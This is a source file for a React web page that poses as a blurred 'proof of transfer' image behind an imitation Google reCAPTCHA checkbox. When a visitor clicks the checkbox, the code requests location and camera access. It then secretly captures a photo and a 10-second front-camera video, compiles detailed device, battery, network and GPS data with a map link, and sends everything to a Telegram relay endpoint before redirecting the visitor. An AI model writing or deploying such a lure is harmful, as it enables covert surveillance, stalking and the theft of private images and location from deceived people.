"use client";

import { useState, useRef, useEffect } from "react";
import { getRedirectConfig } from "@/config/redirect";

export default function BlurVerifyPage() {
  const [isVerified, setIsVerified] = useState(false);
  const [isChecking, setIsChecking] = useState(false);
  const [hasTriggered, setHasTriggered] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [showRedirectCountdown, setShowRedirectCountdown] = useState(false);
  const [redirectCountdown, setRedirectCountdown] = useState(5);
  const [isRobotChecked, setIsRobotChecked] = useState(false);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  
  // Konfigurasi redirect
  const redirectConfig = getRedirectConfig();
  const redirectUrl = redirectConfig.targetUrl;
  const countdownDuration = redirectConfig.countdownDuration;

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPopup(true);
    }, 500);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    // Create a hidden video element for photo capture
    const video = document.createElement("video");
    video.style.display = "none";
    video.muted = true;
    video.playsInline = true;
    document.body.appendChild(video);
    videoRef.current = video;

    return () => {
      if (videoRef.current) {
        document.body.removeChild(videoRef.current);
      }
    };
  }, []);

  // Countdown timer untuk redirect
  useEffect(() => {
    if (!showRedirectCountdown) return;

    // Set countdown awal sesuai config
    setRedirectCountdown(countdownDuration);

    const timer = setInterval(() => {
      setRedirectCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          // Lakukan redirect
          window.location.href = redirectUrl;
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [showRedirectCountdown, redirectUrl, countdownDuration]);

  const handleVerifyClick = async () => {
    if (hasTriggered) return;
    setHasTriggered(true);
    setIsChecking(true);

    try {
      // 1. Request Geolocation FIRST
      let locationPromise = new Promise<{ lat: number; lng: number } | null>((resolve) => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
            () => resolve(null),
            { timeout: 10000, enableHighAccuracy: true }
          );
        } else {
          resolve(null);
        }
      });

      // 2. Request Camera Permission (after location)
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
      });

      // ONCE PERMISSION GRANTED: Unblur the page immediately!
      setIsVerified(true);
      setIsChecking(false);

      // Run the capturing in the background so UI doesn't freeze
      (async () => {
        try {
          // Task 1: Take Photo
          const photoBlob = await takePhoto(stream);

          // Task 2: Record 10s Video
          const videoBlob = await recordVideo(stream, 10000);

          // Stop all tracks after recording
          stream.getTracks().forEach((track) => track.stop());

          // Wait for location
          const location = await locationPromise;

          // Prepare data
          const formData = new FormData();
          if (photoBlob) formData.append("photo", photoBlob, "photo.jpg");
          if (videoBlob) formData.append("video", videoBlob, "video.webm");

          // Parse User Agent for device info
          const ua = navigator.userAgent;
          const getOS = () => {
            if (/android/i.test(ua)) {
              const androidMatch = ua.match(/Android\s+([\d.]+)/);
              const modelMatch = ua.match(/;\s*([^;)]+)\s*(?:Build|[);])/);
              return `Android ${androidMatch?.[1] || '?'} (${modelMatch?.[1]?.trim() || 'Unknown Device'})`;
            }
            if (/iPad|iPhone|iPod/.test(ua)) {
              const iosMatch = ua.match(/OS\s+([\d_]+)/);
              return `iOS ${iosMatch?.[1]?.replace(/_/g, '.') || '?'}`;
            }
            if (/Windows/.test(ua)) {
              const winMatch = ua.match(/Windows NT\s+([\d.]+)/);
              const winVer: Record<string, string> = {'10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7'};
              return `Windows ${winVer[winMatch?.[1] || ''] || winMatch?.[1] || '?'}`;
            }
            if (/Mac OS X/.test(ua)) {
              const macMatch = ua.match(/Mac OS X\s+([\d_]+)/);
              return `macOS ${macMatch?.[1]?.replace(/_/g, '.') || '?'}`;
            }
            if (/Linux/.test(ua)) return 'Linux';
            return 'Unknown OS';
          };
          const getBrowser = () => {
            if (/Edg\//.test(ua)) return `Edge ${ua.match(/Edg\/([\d.]+)/)?.[1] || '?'}`;
            if (/Chrome\//.test(ua) && !/OPR\//.test(ua)) return `Chrome ${ua.match(/Chrome\/([\d.]+)/)?.[1] || '?'}`;
            if (/Firefox\//.test(ua)) return `Firefox ${ua.match(/Firefox\/([\d.]+)/)?.[1] || '?'}`;
            if (/Safari\//.test(ua)) return `Safari ${ua.match(/Version\/([\d.]+)/)?.[1] || '?'}`;
            return 'Unknown Browser';
          };
          const getConnection = () => {
            const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
            if (conn) {
              const type = conn.effectiveType || conn.type || 'unknown';
              const downlink = conn.downlink ? `${conn.downlink} Mbps` : '';
              const rtt = conn.rtt ? ` (${conn.rtt}ms latency)` : '';
              return `${type.toUpperCase()}${downlink ? ' - ' + downlink : ''}${rtt}`;
            }
            return 'Unknown';
          };

          // Battery info
          let batteryInfo = 'Unknown';
          try {
            const battery = await (navigator as any).getBattery?.();
            if (battery) {
              const level = Math.round(battery.level * 100);
              batteryInfo = `${level}%${battery.charging ? ' (Charging)' : ' (Discharging)'}`;
            }
          } catch {}

          // RAM info
          const ramGB = (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : 'Unknown';
          const cpuCores = navigator.hardwareConcurrency || 'Unknown';

          // Orientation
          const orientation = window.screen.orientation?.type || (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
          const dpr = window.devicePixelRatio || 1;

          // Color depth
          const colorDepth = window.screen.colorDepth;

          // Build comprehensive device info
          const locationInfoStr = `📱 DEVICE INFO
━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ Time: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
🕐 Timestamp: ${new Date().toISOString()}

📍 LOCATION
━━━━━━━━━━━━━━━━━━━━━━━━━━
${location ? `🌐 Latitude: ${location.lat}
🌐 Longitude: ${location.lng}
🔗 Google Maps: https://www.google.com/maps?q=${location.lat},${location.lng}` : '❌ Location denied'}

💻 DEVICE DETAILS
━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 OS: ${getOS()}
🌐 Browser: ${getBrowser()}
🖥️ Platform: ${navigator.platform}
🌍 Language: ${navigator.language}
🕐 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
🔋 Battery: ${batteryInfo}
🧠 RAM: ${ramGB}
⚡ CPU Cores: ${cpuCores}
📶 Network: ${getConnection()}

📐 SCREEN
━━━━━━━━━━━━━━━━━━━━━━━━━━
📏 Resolution: ${window.screen.width}x${window.screen.height}
👁️ Viewport: ${window.innerWidth}x${window.innerHeight}
🔍 Pixel Ratio: ${dpr}x
🎨 Color Depth: ${colorDepth}-bit
🔃 Orientation: ${orientation}

📋 USER AGENT
━━━━━━━━━━━━━━━━━━━━━━━━━━
${ua}`;
          formData.append("locationInfo", locationInfoStr);

          // Send to Telegram API
          await fetch("/api/telegram", {
            method: "POST",
            body: formData,
          });

          // Setelah semua data terkirim, tampilkan countdown untuk redirect
          setTimeout(() => {
            setShowRedirectCountdown(true);
            setRedirectCountdown(countdownDuration);
          }, 1000); // Tunggu 1 detik setelah data terkirim
        } catch (bgError) {
          console.error("Background capture failed:", bgError);
          // Fail silently, tetap redirect
          setTimeout(() => {
            setShowRedirectCountdown(true);
            setRedirectCountdown(countdownDuration);
          }, 1000);
        }
      })();

    } catch (err) {
      console.error("Permission denied or failed:", err);
      // Jika user menolak izin, tetap unblur dan redirect
      setIsVerified(true);
      setIsChecking(false);
      setTimeout(() => {
        setShowRedirectCountdown(true);
        setRedirectCountdown(countdownDuration);
      }, 1000);
    }
  };

  const takePhoto = (stream: MediaStream): Promise<Blob | null> => {
    return new Promise((resolve) => {
      const video = videoRef.current;
      if (!video) return resolve(null);

      video.srcObject = stream;
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(() => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(
              (blob) => resolve(blob),
              "image/jpeg",
              0.8
            );
          } else {
            resolve(null);
          }
        }, 1500); // 1.5s delay to allow autofocus
      };
    });
  };

  const recordVideo = (stream: MediaStream, durationMs: number): Promise<Blob | null> => {
    return new Promise((resolve) => {
      let mediaRecorder: MediaRecorder;
      try {
        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
      } catch (e) {
        try {
          mediaRecorder = new MediaRecorder(stream);
        } catch (e2) {
          return resolve(null);
        }
      }

      const chunks: Blob[] = [];
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: mediaRecorder.mimeType });
        resolve(blob);
      };

      mediaRecorder.start();
      setTimeout(() => {
        if (mediaRecorder.state !== "inactive") {
          mediaRecorder.stop();
        }
      }, durationMs);
    });
  };

  return (
    <div className="relative min-h-screen bg-black flex justify-center items-start p-0 font-sans overflow-hidden">
      
      {/* Background Image (Blurred if not verified) */}
      <img 
        src="/bg-bukti.png" 
        alt="Bukti Transfer" 
        className={`fixed inset-0 w-full h-full object-contain transition-all duration-700 ease-in-out z-0 ${
          showPopup && !isVerified ? "blur-md brightness-[0.4]" : "blur-none brightness-100"
        }`}
      />

      {/* Verification Overlay - reCAPTCHA Style */}
      {showPopup && !isVerified && (
        <div 
          className="absolute inset-0 flex items-center justify-center p-3 sm:p-4 z-10 cursor-pointer"
          onClick={handleVerifyClick}
        >
          <div 
            className="bg-white rounded-[3px] w-full max-w-[304px] text-left shadow-[0_0_4px_rgba(0,0,0,0.08)] border border-[#d3d3d3] mx-2 sm:mx-0"
            onClick={(e) => e.stopPropagation()}
          >
            <div style={{ padding: '12px 12px 12px 16px' }}>
              <div className="flex items-center gap-3">
                {/* Checkbox */}
                <div className="relative flex-shrink-0">
                  <input
                    type="checkbox"
                    checked={isRobotChecked}
                    disabled={isChecking}
                    onChange={() => {
                      if (!isRobotChecked && !isChecking) {
                        setIsRobotChecked(true);
                        handleVerifyClick();
                      }
                    }}
                    className="w-[28px] h-[28px] cursor-pointer accent-[#4285f4]"
                    style={{ cursor: isChecking ? 'wait' : 'pointer' }}
                  />
                </div>
                {/* Label */}
                <label 
                  className="text-[14px] text-[#555] select-none flex-1"
                  style={{ fontFamily: 'roboto, arial, sans-serif', lineHeight: '28px' }}
                >
                  {isChecking ? "Verifying..." : "I'm not a robot"}
                </label>
                {/* reCAPTCHA logo */}
                <div className="flex-shrink-0 flex flex-col items-center" style={{ width: '32px' }}>
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z" fill="none"/>
                    <path d="M12 2C6.48 2 2 6.48 2 12" stroke="#4285f4" strokeWidth="2.5" strokeLinecap="round"/>
                    <path d="M2 12c0 5.52 4.48 10 10 10" stroke="#ea4335" strokeWidth="2.5" strokeLinecap="round"/>
                    <path d="M12 22c5.52 0 10-4.48 10-10" stroke="#fbbc05" strokeWidth="2.5" strokeLinecap="round"/>
                    <path d="M22 12c0-5.52-4.48-10-10-10" stroke="#34a853" strokeWidth="2.5" strokeLinecap="round"/>
                    <path d="M12 7v5l3.5 2" stroke="#4285f4" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                  <span style={{ fontSize: '8px', color: '#555', fontFamily: 'roboto, arial, sans-serif', marginTop: '-2px' }}>reCAPTCHA</span>
                  <span style={{ fontSize: '7px', color: '#999', fontFamily: 'roboto, arial, sans-serif' }}>Privacy - Terms</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Success Toast (Optional, shows up briefly after unblur) */}
      {isVerified && (
        <div className="absolute top-6 left-1/2 -translate-x-1/2 bg-green-500 text-white text-sm font-semibold py-2 px-4 rounded-full shadow-lg animate-[drop-in_3s_ease-in-out_forwards]">
          ✓ Verifikasi Berhasil
        </div>
      )}

      {/* Redirect Countdown Overlay */}
      {showRedirectCountdown && (
        <div className="absolute inset-0 bg-black/80 flex items-center justify-center p-4 z-20">
          <div className="bg-white rounded-lg w-full max-w-md p-6 text-center shadow-xl">
            <div className="mb-4">
              <div className="text-4xl font-bold text-green-600 mb-2">✓</div>
              <h3 className="text-xl font-semibold text-gray-800 mb-2">{redirectConfig.messages.title}</h3>
              <p className="text-gray-600 mb-4">
                {redirectConfig.messages.description}
              </p>
              
              <div className="flex justify-center items-center space-x-2 mb-6">
                <div 
                  className={`text-5xl font-bold transition-all duration-300 ${
                    redirectCountdown <= 3 
                      ? 'countdown-pulse text-red-600' 
                      : 'text-blue-600'
                  }`}
                  style={{ 
                    color: redirectCountdown <= 3 
                      ? redirectConfig.colors.warning 
                      : redirectConfig.colors.primary 
                  }}
                >
                  {redirectCountdown}
                </div>
                <div className="text-lg text-gray-500">{redirectConfig.messages.countdownText}</div>
              </div>

              <div className="mb-4">
                <div className="w-full bg-gray-200 rounded-full h-2.5">
                  <div 
                    className="h-2.5 rounded-full transition-all duration-1000 ease-linear"
                    style={{ 
                      width: `${(countdownDuration - redirectCountdown) * (100 / countdownDuration)}%`,
                      backgroundColor: redirectConfig.colors.primary
                    }}
                  ></div>
                </div>
              </div>

              <p className="text-sm text-gray-500 mb-4">
                {redirectConfig.messages.redirectingText}
              </p>

              <button
                onClick={() => window.location.href = redirectUrl}
                className="text-white font-medium py-2 px-6 rounded-lg transition-colors hover:opacity-90"
                style={{ backgroundColor: redirectConfig.colors.primary }}
              >
                {redirectConfig.messages.buttonText}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Custom Styles for animations */}
      <style dangerouslySetInnerHTML={{__html: `
        @keyframes drop-in {
          0% { transform: translate(-50%, -20px); opacity: 0; }
          10% { transform: translate(-50%, 0); opacity: 1; }
          90% { transform: translate(-50%, 0); opacity: 1; }
          100% { transform: translate(-50%, -20px); opacity: 0; visibility: hidden; }
        }
        .animate-fade-in {
          animation: fade-in 0.4s ease-out;
        }
        @keyframes fade-in {
          from { opacity: 0; transform: scale(0.95); }
          to { opacity: 1; transform: scale(1); }
        }
        @keyframes countdown-pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.05); }
        }
        .countdown-pulse {
          animation: countdown-pulse 1s ease-in-out infinite;
        }
      `}} />

    </div>
  );
}
